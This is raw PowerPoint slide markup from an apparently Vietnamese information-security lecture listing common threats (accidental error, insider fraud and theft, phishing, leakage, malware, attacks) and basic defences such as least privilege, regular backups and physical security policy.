          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> threat to integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Disruption: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> threat to integrity and availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Usurpation: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> threat to integrity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C16A45E-ED09-4B2D-B6B4-BFC2C29F201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495800" y="1326865"/>
            <a:ext cx="7696200" cy="53488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879675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noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1524000" y="381000"/>
            <a:ext cx="9982200" cy="576262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>I. TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="575491" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Một số nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> gây mất ATTT phổ biến</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy cơ ngẫu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhiên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy cơ gian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lận</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>trộm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> cắp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy cơ lừa đảo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy cơ rò rỉ thông tin qua các kênh truyền</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy cơ mã độc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy cơ tấn công</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19458" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8534400" y="6400801"/>
            <a:ext cx="2133600" cy="3206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16DD8C5B-82B7-404C-92DD-AEE9B252CC40}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1259516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75491">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="57549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75491">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="575491">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575491">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="57549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75491">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="57549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575491">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="57549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575491">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="575491">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iterate type="lt">
                                    <p:tmPct val="0"/>
                                  </p:iterate>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="36" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="575491">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="57549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Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> ngẫu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhiên</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>Là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> do</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiếu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sót</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vô</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ý, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cẩn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>người</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tự </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhiên</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Giải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Thực</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nguyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tắc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quyền</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiểu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sao </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lưu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đầy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đủ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thường</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>xuyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thông tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Thực</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>toàn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lý</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phù</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hợp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36754132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Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> gian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lận</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trộm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cắp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>Là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> nguy cơ xuất </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>từ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nội</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bộ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Ví</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>viên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lấy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cắp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nguồn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>làm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thành</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phẩm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mới</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Giải</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pháp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sách</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>rõ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ràng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đầy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đủ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22885201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Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> lừa đảo</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208899" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" b="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26629"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26765" b="1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2362200" y="1752601"/>
            <a:ext cx="7616060" cy="4154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789336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Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> lừa đảo</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208899" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" b="0">
              <a:solidFill>
                <a:schemeClr val="accent5">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
